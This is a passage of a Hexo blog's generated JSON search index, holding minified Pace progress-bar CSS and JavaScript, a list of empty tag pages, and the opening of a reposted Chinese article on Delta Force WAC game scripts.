.pace-progress[data-progress-text=\"37%\"]:after{right:-131.18px}.pace .pace-progress[data-progress-text=\"38%\"]:after{right:-129.32px}.pace .pace-progress[data-progress-text=\"39%\"]:after{right:-127.46px}.pace .pace-progress[data-progress-text=\"40%\"]:after{right:-125.6px}.pace .pace-progress[data-progress-text=\"41%\"]:after{right:-123.74px}.pace .pace-progress[data-progress-text=\"42%\"]:after{right:-121.88px}.pace .pace-progress[data-progress-text=\"43%\"]:after{right:-120.02px}.pace .pace-progress[data-progress-text=\"44%\"]:after{right:-118.16px}.pace .pace-progress[data-progress-text=\"45%\"]:after{right:-116.3px}.pace .pace-progress[data-progress-text=\"46%\"]:after{right:-114.44px}.pace .pace-progress[data-progress-text=\"47%\"]:after{right:-112.58px}.pace .pace-progress[data-progress-text=\"48%\"]:after{right:-110.72px}.pace .pace-progress[data-progress-text=\"49%\"]:after{right:-108.86px}.pace .pace-progress[data-progress-text=\"50%\"]:after{right:-107px}.pace .pace-progress[data-progress-text=\"51%\"]:after{right:-105.14px}.pace .pace-progress[data-progress-text=\"52%\"]:after{right:-103.28px}.pace .pace-progress[data-progress-text=\"53%\"]:after{right:-101.42px}.pace .pace-progress[data-progress-text=\"54%\"]:after{right:-99.56px}.pace .pace-progress[data-progress-text=\"55%\"]:after{right:-97.7px}.pace .pace-progress[data-progress-text=\"56%\"]:after{right:-95.84px}.pace .pace-progress[data-progress-text=\"57%\"]:after{right:-93.98px}.pace .pace-progress[data-progress-text=\"58%\"]:after{right:-92.12px}.pace .pace-progress[data-progress-text=\"59%\"]:after{right:-90.26px}.pace .pace-progress[data-progress-text=\"60%\"]:after{right:-88.4px}.pace .pace-progress[data-progress-text=\"61%\"]:after{right:-86.54px}.pace .pace-progress[data-progress-text=\"62%\"]:after{right:-84.68px}.pace .pace-progress[data-progress-text=\"63%\"]:after{right:-82.82px}.pace .pace-progress[data-progress-text=\"64%\"]:after{right:-80.96px}.pace .pace-progress[data-progress-text=\"65%\"]:after{right:-79.1px}.pace .pace-progress[data-progress-text=\"66%\"]:after{right:-77.24px}.pace .pace-progress[data-progress-text=\"67%\"]:after{right:-75.38px}.pace .pace-progress[data-progress-text=\"68%\"]:after{right:-73.52px}.pace .pace-progress[data-progress-text=\"69%\"]:after{right:-71.66px}.pace .pace-progress[data-progress-text=\"70%\"]:after{right:-69.8px}.pace .pace-progress[data-progress-text=\"71%\"]:after{right:-67.94px}.pace .pace-progress[data-progress-text=\"72%\"]:after{right:-66.08px}.pace .pace-progress[data-progress-text=\"73%\"]:after{right:-64.22px}.pace .pace-progress[data-progress-text=\"74%\"]:after{right:-62.36px}.pace .pace-progress[data-progress-text=\"75%\"]:after{right:-60.5px}.pace .pace-progress[data-progress-text=\"76%\"]:after{right:-58.64px}.pace .pace-progress[data-progress-text=\"77%\"]:after{right:-56.78px}.pace .pace-progress[data-progress-text=\"78%\"]:after{right:-54.92px}.pace .pace-progress[data-progress-text=\"79%\"]:after{right:-53.06px}.pace .pace-progress[data-progress-text=\"80%\"]:after{right:-51.2px}.pace .pace-progress[data-progress-text=\"81%\"]:after{right:-49.34px}.pace .pace-progress[data-progress-text=\"82%\"]:after{right:-47.48px}.pace .pace-progress[data-progress-text=\"83%\"]:after{right:-45.62px}.pace .pace-progress[data-progress-text=\"84%\"]:after{right:-43.76px}.pace .pace-progress[data-progress-text=\"85%\"]:after{right:-41.9px}.pace .pace-progress[data-progress-text=\"86%\"]:after{right:-40.04px}.pace .pace-progress[data-progress-text=\"87%\"]:after{right:-38.18px}.pace .pace-progress[data-progress-text=\"88%\"]:after{right:-36.32px}.pace .pace-progress[data-progress-text=\"89%\"]:after{right:-34.46px}.pace .pace-progress[data-progress-text=\"90%\"]:after{right:-32.6px}.pace .pace-progress[data-progress-text=\"91%\"]:after{right:-30.74px}.pace .pace-progress[data-progress-text=\"92%\"]:after{right:-28.88px}.pace .pace-progress[data-progress-text=\"93%\"]:after{right:-27.02px}.pace .pace-progress[data-progress-text=\"94%\"]:after{right:-25.16px}.pace .pace-progress[data-progress-text=\"95%\"]:after{right:-23.3px}.pace .pace-progress[data-progress-text=\"96%\"]:after{right:-21.44px}.pace .pace-progress[data-progress-text=\"97%\"]:after{right:-19.58px}.pace .pace-progress[data-progress-text=\"98%\"]:after{right:-17.72px}.pace .pace-progress[data-progress-text=\"99%\"]:after{right:-15.86px}.pace .pace-progress[data-progress-text=\"100%\"]:after{right:-14px}.pace .pace-activity{position:absolute;width:100%;height:28px;z-index:2001;box-shadow:inset 0 0 0 2px #29d,inset 0 0 0 7px #FFF;border-radius:10px}.pace.pace-inactive{display:none}"},{"title":"","date":"2021-11-26T18:32:03.307Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-mac-osx.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-mac-osx.min.css","excerpt":"","text":".pace,.pace .pace-progress{width:100%;height:12px;overflow:hidden}.pace,.pace .pace-activity{position:fixed;top:0;left:0}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;background:#fff}.pace-inactive{display:none}.pace .pace-progress{background-color:#0087E1;position:fixed;top:0;right:100%;-webkit-border-radius:0 0 4px;-moz-border-radius:0 0 4px;-o-border-radius:0 0 4px;border-radius:0 0 4px;-webkit-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);-moz-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);-o-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3)}.pace .pace-activity{right:-28px;bottom:0;-webkit-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-moz-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-o-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-webkit-background-size:28px 100%;-moz-background-size:28px 100%;-o-background-size:28px 100%;background-size:28px 100%;-webkit-animation:pace-theme-mac-osx-motion .5s linear infinite;-moz-animation:pace-theme-mac-osx-motion .5s linear infinite;-ms-animation:pace-theme-mac-osx-motion .5s linear infinite;-o-animation:pace-theme-mac-osx-motion .5s linear infinite;animation:pace-theme-mac-osx-motion .5s linear infinite}@-webkit-keyframes pace-theme-mac-osx-motion{0%{-webkit-transform:none;transform:none}100%{-webkit-transform:translate(-28px,0);transform:translate(-28px,0)}}@-moz-keyframes pace-theme-mac-osx-motion{0%{-moz-transform:none;transform:none}100%{-moz-transform:translate(-28px,0);transform:translate(-28px,0)}}@-o-keyframes pace-theme-mac-osx-motion{0%{-o-transform:none;transform:none}100%{-o-transform:translate(-28px,0);transform:translate(-28px,0)}}@-ms-keyframes pace-theme-mac-osx-motion{0%{-ms-transform:none;transform:none}100%{-ms-transform:translate(-28px,0);transform:translate(-28px,0)}}@keyframes pace-theme-mac-osx-motion{0%{transform:none}100%{transform:translate(-28px,0)}}"},{"title":"","date":"2021-11-26T18:32:03.309Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-minimal.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-minimal.min.css","excerpt":"","text":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#29d;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}"},{"title":"","date":"2021-11-26T18:32:03.312Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace.min.js","permalink":"https://hexo.bangz.me/lib/pace/pace.min.js","excerpt":"","text":"/*! pace 1.0.2 */ (function(){var a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X=[].slice,Y={}.hasOwnProperty,Z=function(a,b){function c(){this.constructor=a}for(var d in b)Y.call(b,d)&&(a[d]=b[d]);return c.prototype=b.prototype,a.prototype=new c,a.__super__=b.prototype,a},$=[].indexOf||function(a){for(var b=0,c=this.length;c>b;b++)if(b in this&&this[b]===a)return b;return-1};for(u={catchupTime:100,initialRate:.03,minTime:250,ghostTime:100,maxProgressPerFrame:20,easeFactor:1.25,startOnPageLoad:!0,restartOnPushState:!0,restartOnRequestAfter:500,target:\"body\",elements:{checkInterval:100,selectors:[\"body\"]},eventLag:{minSamples:10,sampleCount:3,lagThreshold:3},ajax:{trackMethods:[\"GET\"],trackWebSockets:!0,ignoreURLs:[]}},C=function(){var a;return null!=(a=\"undefined\"!=typeof performance&&null!==performance&&\"function\"==typeof performance.now?performance.now():void 0)?a:+new Date},E=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame,t=window.cancelAnimationFrame||window.mozCancelAnimationFrame,null==E&&(E=function(a){return setTimeout(a,50)},t=function(a){return clearTimeout(a)}),G=function(a){var b,c;return b=C(),(c=function(){var d;return d=C()-b,d>=33?(b=C(),a(d,function(){return E(c)})):setTimeout(c,33-d)})()},F=function(){var a,b,c;return c=arguments[0],b=arguments[1],a=3f;f++)if(c=d[f])for(a in c)Y.call(c,a)&&(e=c[a],null!=b[a]&&\"object\"==typeof b[a]&&null!=e&&\"object\"==typeof e?v(b[a],e):b[a]=e);return b},q=function(a){var b,c,d,e,f;for(c=b=0,e=0,f=a.length;f>e;e++)d=a[e],c+=Math.abs(d),b++;return c/b},x=function(a,b){var c,d,e;if(null==a&&(a=\"options\"),null==b&&(b=!0),e=document.querySelector(\"[data-pace-\"+a+\"]\")){if(c=e.getAttribute(\"data-pace-\"+a),!b)return c;try{return JSON.parse(c)}catch(f){return d=f,\"undefined\"!=typeof console&&null!==console?console.error(\"Error parsing inline pace options\",d):void 0}}},g=function(){function a(){}return a.prototype.on=function(a,b,c,d){var e;return null==d&&(d=!1),null==this.bindings&&(this.bindings={}),null==(e=this.bindings)[a]&&(e[a]=[]),this.bindings[a].push({handler:b,ctx:c,once:d})},a.prototype.once=function(a,b,c){return this.on(a,b,c,!0)},a.prototype.off=function(a,b){var c,d,e;if(null!=(null!=(d=this.bindings)?d[a]:void 0)){if(null==b)return delete this.bindings[a];for(c=0,e=[];cQ;Q++)K=U[Q],D[K]===!0&&(D[K]=u[K]);i=function(a){function b(){return V=b.__super__.constructor.apply(this,arguments)}return Z(b,a),b}(Error),b=function(){function a(){this.progress=0}return a.prototype.getElement=function(){var a;if(null==this.el){if(a=document.querySelector(D.target),!a)throw new i;this.el=document.createElement(\"div\"),this.el.className=\"pace pace-active\",document.body.className=document.body.className.replace(/pace-done/g,\"\"),document.body.className+=\" pace-running\",this.el.innerHTML='\\n \\n\\n',null!=a.firstChild?a.insertBefore(this.el,a.firstChild):a.appendChild(this.el)}return this.el},a.prototype.finish=function(){var a;return a=this.getElement(),a.className=a.className.replace(\"pace-active\",\"\"),a.className+=\"pace-inactive\",document.body.className=document.body.className.replace(\"pace-running\",\"\"),document.body.className+=\" pace-done\"},a.prototype.update=function(a){return this.progress=a,this.render()},a.prototype.destroy=function(){try{this.getElement().parentNode.removeChild(this.getElement())}catch(a){i=a}return this.el=void 0},a.prototype.render=function(){var a,b,c,d,e,f,g;if(null==document.querySelector(D.target))return!1;for(a=this.getElement(),d=\"translate3d(\"+this.progress+\"%, 0, 0)\",g=[\"webkitTransform\",\"msTransform\",\"transform\"],e=0,f=g.length;f>e;e++)b=g[e],a.children[0].style[b]=d;return(!this.lastRenderedProgress||this.lastRenderedProgress|0!==this.progress|0)&&(a.children[0].setAttribute(\"data-progress-text\",\"\"+(0|this.progress)+\"%\"),this.progress>=100?c=\"99\":(c=this.progress=100},a}(),h=function(){function a(){this.bindings={}}return a.prototype.trigger=function(a,b){var c,d,e,f,g;if(null!=this.bindings[a]){for(f=this.bindings[a],g=[],d=0,e=f.length;e>d;d++)c=f[d],g.push(c.call(this,b));return g}},a.prototype.on=function(a,b){var c;return null==(c=this.bindings)[a]&&(c[a]=[]),this.bindings[a].push(b)},a}(),P=window.XMLHttpRequest,O=window.XDomainRequest,N=window.WebSocket,w=function(a,b){var c,d,e;e=[];for(d in b.prototype)try{e.push(null==a[d]&&\"function\"!=typeof b[d]?\"function\"==typeof Object.defineProperty?Object.defineProperty(a,d,{get:function(){return b.prototype[d]},configurable:!0,enumerable:!0}):a[d]=b.prototype[d]:void 0)}catch(f){c=f}return e},A=[],j.ignore=function(){var a,b,c;return b=arguments[0],a=2=0)return!0}return!1},k=function(a){function b(){var a,c=this;b.__super__.constructor.apply(this,arguments),a=function(a){var b;return b=a.open,a.open=function(d,e){return J(d)&&c.trigger(\"request\",{type:d,url:e,request:a}),b.apply(a,arguments)}},window.XMLHttpRequest=function(b){var c;return c=new P(b),a(c),c};try{w(window.XMLHttpRequest,P)}catch(d){}if(null!=O){window.XDomainRequest=function(){var b;return b=new O,a(b),b};try{w(window.XDomainRequest,O)}catch(d){}}if(null!=N&&D.ajax.trackWebSockets){window.WebSocket=function(a,b){var d;return d=null!=b?new N(a,b):new N(a),J(\"socket\")&&c.trigger(\"request\",{type:\"socket\",url:a,protocols:b,request:d}),d};try{w(window.WebSocket,N)}catch(d){}}}return Z(b,a),b}(h),R=null,y=function(){return null==R&&(R=new k),R},I=function(a){var b,c,d,e;for(e=D.ajax.ignoreURLs,c=0,d=e.length;d>c;c++)if(b=e[c],\"string\"==typeof b){if(-1!==a.indexOf(b))return!0}else if(b.test(a))return!0;return!1},y().on(\"request\",function(b){var c,d,e,f,g;return f=b.type,e=b.request,g=b.url,I(g)?void 0:j.running||D.restartOnRequestAfter===!1&&\"force\"!==J(f)?void 0:(d=arguments,c=D.restartOnRequestAfter||0,\"boolean\"==typeof c&&(c=0),setTimeout(function(){var b,c,g,h,i,k;if(b=\"socket\"===f?e.readyStatec;c++){if(K=i[c],K instanceof a){K.watch.apply(K,d);break}k.push(void 0)}return k}},c))}),a=function(){function a(){var a=this;this.elements=[],y().on(\"request\",function(){return a.watch.apply(a,arguments)})}return a.prototype.watch=function(a){var b,c,d,e;return d=a.type,b=a.request,e=a.url,I(e)?void 0:(c=\"socket\"===d?new n(b):new o(b),this.elements.push(c))},a}(),o=function(){function a(a){var b,c,d,e,f,g,h=this;if(this.progress=0,null!=window.ProgressEvent)for(c=null,a.addEventListener(\"progress\",function(a){return h.progress=a.lengthComputable?100*a.loaded/a.total:h.progress+(100-h.progress)/2},!1),g=[\"load\",\"abort\",\"timeout\",\"error\"],d=0,e=g.length;e>d;d++)b=g[d],a.addEventListener(b,function(){return h.progress=100},!1);else f=a.onreadystatechange,a.onreadystatechange=function(){var b;return 0===(b=a.readyState)||4===b?h.progress=100:3===a.readyState&&(h.progress=50),\"function\"==typeof f?f.apply(null,arguments):void 0}}return a}(),n=function(){function a(a){var b,c,d,e,f=this;for(this.progress=0,e=[\"error\",\"open\"],c=0,d=e.length;d>c;c++)b=e[c],a.addEventListener(b,function(){return f.progress=100},!1)}return a}(),d=function(){function a(a){var b,c,d,f;for(null==a&&(a={}),this.elements=[],null==a.selectors&&(a.selectors=[]),f=a.selectors,c=0,d=f.length;d>c;c++)b=f[c],this.elements.push(new e(b))}return a}(),e=function(){function a(a){this.selector=a,this.progress=0,this.check()}return a.prototype.check=function(){var a=this;return document.querySelector(this.selector)?this.done():setTimeout(function(){return a.check()},D.elements.checkInterval)},a.prototype.done=function(){return this.progress=100},a}(),c=function(){function a(){var a,b,c=this;this.progress=null!=(b=this.states[document.readyState])?b:100,a=document.onreadystatechange,document.onreadystatechange=function(){return null!=c.states[document.readyState]&&(c.progress=c.states[document.readyState]),\"function\"==typeof a?a.apply(null,arguments):void 0}}return a.prototype.states={loading:0,interactive:50,complete:100},a}(),f=function(){function a(){var a,b,c,d,e,f=this;this.progress=0,a=0,e=[],d=0,c=C(),b=setInterval(function(){var g;return g=C()-c-50,c=C(),e.push(g),e.length>D.eventLag.sampleCount&&e.shift(),a=q(e),++d>=D.eventLag.minSamples&&a=100&&(this.done=!0),b===this.last?this.sinceLastUpdate+=a:(this.sinceLastUpdate&&(this.rate=(b-this.last)/this.sinceLastUpdate),this.catchup=(b-this.progress)/D.catchupTime,this.sinceLastUpdate=0,this.last=b),b>this.progress&&(this.progress+=this.catchup*a),c=1-Math.pow(this.progress/100,D.easeFactor),this.progress+=c*this.rate*a,this.progress=Math.min(this.lastProgress+D.maxProgressPerFrame,this.progress),this.progress=Math.max(0,this.progress),this.progress=Math.min(100,this.progress),this.lastProgress=this.progress,this.progress},a}(),L=null,H=null,r=null,M=null,p=null,s=null,j.running=!1,z=function(){return D.restartOnPushState?j.restart():void 0},null!=window.history.pushState&&(T=window.history.pushState,window.history.pushState=function(){return z(),T.apply(window.history,arguments)}),null!=window.history.replaceState&&(W=window.history.replaceState,window.history.replaceState=function(){return z(),W.apply(window.history,arguments)}),l={ajax:a,elements:d,document:c,eventLag:f},(B=function(){var a,c,d,e,f,g,h,i;for(j.sources=L=[],g=[\"ajax\",\"elements\",\"document\",\"eventLag\"],c=0,e=g.length;e>c;c++)a=g[c],D[a]!==!1&&L.push(new l[a](D[a]));for(i=null!=(h=D.extraSources)?h:[],d=0,f=i.length;f>d;d++)K=i[d],L.push(new K(D));return j.bar=r=new b,H=[],M=new m})(),j.stop=function(){return j.trigger(\"stop\"),j.running=!1,r.destroy(),s=!0,null!=p&&(\"function\"==typeof t&&t(p),p=null),B()},j.restart=function(){return j.trigger(\"restart\"),j.stop(),j.start()},j.go=function(){var a;return j.running=!0,r.render(),a=C(),s=!1,p=G(function(b,c){var d,e,f,g,h,i,k,l,n,o,p,q,t,u,v,w;for(l=100-r.progress,e=p=0,f=!0,i=q=0,u=L.length;u>q;i=++q)for(K=L[i],o=null!=H[i]?H[i]:H[i]=[],h=null!=(w=K.elements)?w:[K],k=t=0,v=h.length;v>t;k=++t)g=h[k],n=null!=o[k]?o[k]:o[k]=new m(g),f&=n.done,n.done||(e++,p+=n.tick(b));return d=p/e,r.update(M.tick(b,d)),r.done()||f||s?(r.update(100),j.trigger(\"done\"),setTimeout(function(){return r.finish(),j.running=!1,j.trigger(\"hide\")},Math.max(D.ghostTime,Math.max(D.minTime-(C()-a),0)))):c()})},j.start=function(a){v(D,a),j.running=!0;try{r.render()}catch(b){i=b}return document.querySelector(\".pace\")?(j.trigger(\"start\"),j.go()):setTimeout(j.start,50)},\"function\"==typeof define&&define.amd?define([\"pace\"],function(){return j}):\"object\"==typeof exports?module.exports=j:D.startOnPageLoad&&j.start()}).call(this);"},{"title":"Apache","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Apache/index.html","permalink":"https://hexo.bangz.me/tags/Apache/index.html","excerpt":"","text":""},{"title":"Elementary-OS","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Elementary-OS/index.html","permalink":"https://hexo.bangz.me/tags/Elementary-OS/index.html","excerpt":"","text":""},{"title":"CSS3","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/CSS3/index.html","permalink":"https://hexo.bangz.me/tags/CSS3/index.html","excerpt":"","text":""},{"title":"CentOS","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/CentOS/index.html","permalink":"https://hexo.bangz.me/tags/CentOS/index.html","excerpt":"","text":""},{"title":"Discuz","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Discuz/index.html","permalink":"https://hexo.bangz.me/tags/Discuz/index.html","excerpt":"","text":""},{"title":"HTML5","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/HTML5/index.html","permalink":"https://hexo.bangz.me/tags/HTML5/index.html","excerpt":"","text":""},{"title":"HTTP","date":"2018-06-06T15:32:32.000Z","updated":"2018-07-13T11:42:23.000Z","comments":false,"path":"tags/HTTP/index.html","permalink":"https://hexo.bangz.me/tags/HTTP/index.html","excerpt":"","text":""},{"title":"Java","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Java/index.html","permalink":"https://hexo.bangz.me/tags/Java/index.html","excerpt":"","text":""},{"title":"JavaEE","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/JavaEE/index.html","permalink":"https://hexo.bangz.me/tags/JavaEE/index.html","excerpt":"","text":""},{"title":"LAMP","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/LAMP/index.html","permalink":"https://hexo.bangz.me/tags/LAMP/index.html","excerpt":"","text":""},{"title":"Linux 基础","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Linux基础/index.html","permalink":"https://hexo.bangz.me/tags/Linux基础/index.html","excerpt":"","text":""},{"title":"Mac","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Mac/index.html","permalink":"https://hexo.bangz.me/tags/Mac/index.html","excerpt":"","text":""},{"title":"MySQL","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/MySQL/index.html","permalink":"https://hexo.bangz.me/tags/MySQL/index.html","excerpt":"","text":""},{"title":"OpenStack","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/OpenStack/index.html","permalink":"https://hexo.bangz.me/tags/OpenStack/index.html","excerpt":"","text":""},{"title":"OpenWRT","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/OpenWRT/index.html","permalink":"https://hexo.bangz.me/tags/OpenWRT/index.html","excerpt":"","text":""},{"title":"PHP","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/PHP/index.html","permalink":"https://hexo.bangz.me/tags/PHP/index.html","excerpt":"","text":""},{"title":"PYTHON","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/PYTHON/index.html","permalink":"https://hexo.bangz.me/tags/PYTHON/index.html","excerpt":"","text":""},{"title":"Shadowsocks","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Shadowsocks/index.html","permalink":"https://hexo.bangz.me/tags/Shadowsocks/index.html","excerpt":"","text":""},{"title":"Shell","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Shell/index.html","permalink":"https://hexo.bangz.me/tags/Shell/index.html","excerpt":"","text":""},{"title":"Sierra","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/Sierra/index.html","permalink":"https://hexo.bangz.me/tags/Sierra/index.html","excerpt":"","text":""},{"title":"U 盘镜像","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/U盘镜像/index.html","permalink":"https://hexo.bangz.me/tags/U盘镜像/index.html","excerpt":"","text":""},{"title":"Vue","date":"2018-06-06T15:32:32.000Z","updated":"2018-07-10T06:41:06.000Z","comments":false,"path":"tags/Vue/index.html","permalink":"https://hexo.bangz.me/tags/Vue/index.html","excerpt":"","text":""},{"title":"ajax","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/ajax/index.html","permalink":"https://hexo.bangz.me/tags/ajax/index.html","excerpt":"","text":""},{"title":"eOS","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/eOS/index.html","permalink":"https://hexo.bangz.me/tags/eOS/index.html","excerpt":"","text":""},{"title":"iconfont","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/iconfont/index.html","permalink":"https://hexo.bangz.me/tags/iconfont/index.html","excerpt":"","text":""},{"title":"git","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/git/index.html","permalink":"https://hexo.bangz.me/tags/git/index.html","excerpt":"","text":""},{"title":"webpack","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/webpack/index.html","permalink":"https://hexo.bangz.me/tags/webpack/index.html","excerpt":"","text":""},{"title":"width","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/width/index.html","permalink":"https://hexo.bangz.me/tags/width/index.html","excerpt":"","text":""},{"title":"javascript","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/javascript/index.html","permalink":"https://hexo.bangz.me/tags/javascript/index.html","excerpt":"","text":""},{"title":"windows","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/windows/index.html","permalink":"https://hexo.bangz.me/tags/windows/index.html","excerpt":"","text":""},{"title":"云计算","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/云计算/index.html","permalink":"https://hexo.bangz.me/tags/云计算/index.html","excerpt":"","text":""},{"title":"前端","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/前端/index.html","permalink":"https://hexo.bangz.me/tags/前端/index.html","excerpt":"","text":""},{"title":"字体图标","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/字体图标/index.html","permalink":"https://hexo.bangz.me/tags/字体图标/index.html","excerpt":"","text":""},{"title":"小程序","date":"2018-06-06T15:32:32.000Z","updated":"2018-07-13T11:40:37.000Z","comments":false,"path":"tags/小程序/index.html","permalink":"https://hexo.bangz.me/tags/小程序/index.html","excerpt":"","text":""},{"title":"搜索引擎","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/搜索引擎/index.html","permalink":"https://hexo.bangz.me/tags/搜索引擎/index.html","excerpt":"","text":""},{"title":"操作系统","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/操作系统/index.html","permalink":"https://hexo.bangz.me/tags/操作系统/index.html","excerpt":"","text":""},{"title":"系统安装","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/系统安装/index.html","permalink":"https://hexo.bangz.me/tags/系统安装/index.html","excerpt":"","text":""},{"title":"网络安全","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/网络安全/index.html","permalink":"https://hexo.bangz.me/tags/网络安全/index.html","excerpt":"","text":""},{"title":"随笔","date":"2018-06-06T15:32:32.000Z","updated":"2018-06-06T15:32:32.000Z","comments":false,"path":"tags/随笔/index.html","permalink":"https://hexo.bangz.me/tags/随笔/index.html","excerpt":"","text":""}],"posts":[{"title":"三角洲特种部队 WAC 脚本帮助","slug":"novalogic-wac-script-api-reference","date":"2022-12-22T03:58:29.000Z","updated":"2022-12-22T04:48:46.730Z","comments":true,"path":"archives/novalogic-wac-script-api-reference.html","link":"","permalink":"https://hexo.bangz.me/archives/novalogic-wac-script-api-reference.html","excerpt":"以前网易博客的旧文重发，本文收集了多篇来自多家论坛上的 WAC 脚本说明主要适用于联合行动 Joint Operations 和三角洲特种部队：极限版 Delta Force:Xtreme 之后的版本三角洲特种部队：黑鹰坠落 Delta force: Black Hawk Down 及之前版本会有部分功能不可用，需自行排查","text":"以前网易博客的旧文重发，本文收集了多篇来自多家论坛上的 WAC 脚本说明主要适用于联合行动 Joint Operations 和三角洲特种部队：极限版 Delta Force:Xtreme 之后的版本三角洲特种部队：黑鹰坠落 Delta force: Black Hawk Down 及之前版本会有部分功能不可用，需自行排查 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436